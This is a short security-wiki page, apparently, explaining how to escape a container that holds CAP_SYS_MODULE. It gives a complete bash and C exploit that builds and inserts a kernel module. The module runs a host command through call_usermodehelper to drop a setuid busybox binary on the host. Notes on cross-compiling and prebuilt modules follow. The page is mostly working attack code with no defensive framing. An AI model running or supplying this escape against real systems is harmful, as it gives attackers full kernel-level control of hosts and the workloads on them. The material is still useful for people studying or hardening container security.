---
title: "CAP_SYS_MODULE: container escape by loading a kernel module"
description: "Escaping a container that holds CAP_SYS_MODULE by compiling and inserting an attacker-controlled kernel module, which executes in the host kernel and gives full host code execution."
keywords:
  - CAP_SYS_MODULE
  - kernel module
  - insmod
  - container escape
  - linux capabilities
---

# CAP_SYS_MODULE

`CAP_SYS_MODULE` lets the container load kernel modules. A module runs in the host kernel, so loading an attacker-built one is immediate, total host compromise.

```bash
capsh --print | grep -q cap_sys_module && echo have

# Build a tiny module whose init runs a usermode helper on the host
cat > esc.c <<'C'
#include <linux/module.h>
#include <linux/kmod.h>
static int __init e(void){ char *a[]={"/bin/sh","-c","cp /bin/busybox /host_marker; chmod +s /host_marker",NULL};
  char *env[]={"PATH=/sbin:/bin",NULL}; call_usermodehelper(a[0],a,env,UMH_WAIT_EXEC); return 0;}
static void __exit x(void){} module_init(e); module_exit(x); MODULE_LICENSE("GPL");
C
make -C /lib/modules/$(uname -r)/build M=$PWD modules && insmod esc.ko
```

## Exploitation notes

- The module's init function runs in ring 0; `call_usermodehelper` spawns a host process, which is the simplest payload.
- Building needs kernel headers matching the host; where they are absent, cross-compile against the host version or ship a prebuilt `.ko`.
- This is one of the cleanest single-capability escapes: no mounts, no namespaces, no host-visible-path trick.

## References

- [man 2 init_module](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [man 7 capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
